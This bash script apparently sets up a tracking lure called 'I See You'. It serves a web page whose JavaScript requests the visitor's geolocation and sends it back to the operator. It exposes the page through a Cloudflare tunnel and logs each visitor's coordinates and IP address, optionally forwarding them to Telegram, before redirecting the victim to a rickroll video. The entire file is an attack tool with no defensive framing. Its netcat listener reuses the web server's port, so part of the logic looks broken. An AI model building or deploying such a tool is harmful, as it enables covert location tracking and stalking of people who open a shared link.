#!/bin/bash

clear

# Prompt for port
read -p "[?] Enter port to use for local server (default 8080): " PORT
PORT=${PORT:-8080}

# Set up paths
WEB_DIR="$HOME/webpage"
LOG_DIR="$HOME/iseeu/logs"
TMP_CF_LOG="$HOME/iseeu/cf_output.log"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"
TELEGRAM_SCRIPT="$HOME/iseeu/telegram_notify.py"

mkdir -p "$WEB_DIR" "$LOG_DIR"
> "$LOG_FILE"
> "$TMP_CF_LOG"

echo "[*] Killing old servers..."
pkill -f "python3 -m http.server" 2>/dev/null
pkill -f cloudflared 2>/dev/null

echo "[*] Creating minimal HTML..."
cat <<EOF > "$WEB_DIR/index.html"
<!DOCTYPE html>
<html>
<head><title>I See You</title></head>
<body>
<script>
navigator.geolocation.getCurrentPosition(pos => {
  let coords = pos.coords.latitude + "," + pos.coords.longitude;
  fetch("/logme/" + coords);
  location.href = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
});
</script>
<h1>Loading...</h1>
</body>
</html>
EOF

cd "$WEB_DIR" || exit 1

echo "[*] Starting HTTP server on port $PORT..."
python3 -m http.server "$PORT" > /dev/null 2>&1 &
SERVER_PID=$!

echo "[*] Starting Cloudflared tunnel..."
cloudflared tunnel --url "http://localhost:$PORT" > "$TMP_CF_LOG" 2>&1 &
CF_PID=$!

# Wait for Cloudflared public URL
echo -n "[*] Waiting for Cloudflared URL"
for i in {1..10}; do
  sleep 1
  echo -n "."
  PUBLIC_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare\.com" "$TMP_CF_LOG" | head -n1)
  if [[ -n "$PUBLIC_URL" ]]; then break; fi
done
echo

if [[ -z "$PUBLIC_URL" ]]; then
  echo "[✗] Failed to get public URL."
  kill "$SERVER_PID" "$CF_PID" 2>/dev/null
  exit 1
fi

echo "[✓] Public URL: $PUBLIC_URL"
echo "[*] Logging to $LOG_FILE..."

# Start background netcat listener
nc -lk -p "$PORT" | while read line; do
  if [[ "$line" == *"/logme/"* ]]; then
    GPS=$(echo "$line" | cut -d' ' -f2 | cut -d'/' -f3)
    IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
    echo "[$(date)] GPS: $GPS | IP: $IP" >> "$LOG_FILE"
    if [[ -f "$TELEGRAM_SCRIPT" ]]; then
      python3 "$TELEGRAM_SCRIPT" "$GPS" "$IP"
    fi
  fi
done &
NC_PID=$!

# Clean up on Ctrl+C
trap 'echo; echo "[*] Cleaning up..."; kill $SERVER_PID $CF_PID $NC_PID 2>/dev/null; rm -f "$TMP_CF_LOG"; echo "[*] Done.";' INT

echo "[*] Press Ctrl+C to stop."
wait